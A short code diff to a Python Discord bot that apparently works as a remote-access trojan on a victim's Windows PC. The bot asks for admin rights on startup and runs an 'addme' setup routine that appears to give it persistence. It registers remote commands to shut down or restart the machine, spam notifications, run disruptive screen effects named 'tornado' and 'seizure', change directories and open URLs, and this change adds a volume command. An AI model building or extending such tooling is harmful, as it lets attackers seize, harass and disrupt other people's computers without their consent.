@@ -10,7 +10,7 @@ from command.gdicommands import tornado_command, screenswipe_command, seizure_co
 
 startuplogic.askadmin.setup()
 startuplogic.addme.run_setup_in_thread()
-from command.useful import search_command, cd_command, openurl_command, restartpc_command, shutdownpc_command
+from command.useful import search_command, setvol_command, cd_command, openurl_command, restartpc_command, shutdownpc_command
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents)
@@ -64,5 +64,5 @@ bot.add_command(commands.Command(shutdownpc_command.shutdownpc, name='shutdownpc
 bot.add_command(commands.Command(notificationspam_command.spamnotify, name='spamnotify'))
 bot.add_command(commands.Command(cd_command.cd_command, name='cd'))
 bot.add_command(commands.Command(screenswipe_command.screenswipe, name='screenswipe'))
-
+bot.add_command(commands.Command(setvol_command.vol_command, name='setvol'))
 bot.run(discodd.TOKEN)
